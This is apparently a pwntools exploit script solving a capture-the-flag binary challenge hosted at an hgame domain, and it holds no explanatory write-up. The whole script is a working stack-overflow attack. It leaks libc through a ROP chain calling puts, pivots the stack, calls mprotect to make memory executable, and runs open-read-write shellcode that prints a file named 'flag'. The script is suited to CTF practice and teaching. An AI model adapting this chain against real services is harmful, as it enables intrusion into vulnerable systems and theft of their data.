from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["week-1.hgame.lwsec.cn", 31482]
elf = ELF('./vuln')
libc=ELF('./libc-2.31.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./vuln_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p)

main = p64(0x4012c4)
pop_rdi = p64(0x401393)
puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
ret = p64(0x40101a)

shellcode = asm('''
    push 0x67616c66 
    mov rdi,rsp
    xor esi,esi 
    mov eax,2
    syscall
    mov edi,eax
    sub rsp,0xa
    mov rsi,rsp
    mov rdx,0x30
    xor eax,eax
    syscall
    xor edi,2 
    add rsp,0xa
    mov rsi,rsp
    mov rdx,0x29
    mov eax,edi
    syscall 
    ''')

ru(b'task.\n')
payload = b'a' * (0x100 + 8) + pop_rdi + puts_got + puts_plt + main
s(payload)

leak_addr = u64(rl()[:-1].ljust(8,b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - libc.sym['puts']
pr('libc_base', libc_base)
mprotect_addr = p64(libc_base + libc.sym['mprotect'])

pop_rdi = p64(libc_base + 0x23b6a)
pop_rsi = p64(libc_base + 0x2601f)
pop_rdx = p64(libc_base + 0x142c92)

pause()
payload = b'a' * (0x100) + p64(0x404040) + pop_rsi + p64(0x404048) + p64(0x4012de)
s(payload)

pause()
payload =  pop_rdi + p64(0x404000) + pop_rsi + p64(0x1000) + pop_rdx + p64(7) + mprotect_addr + p64(0x404088) + shellcode
s(payload)

shell()
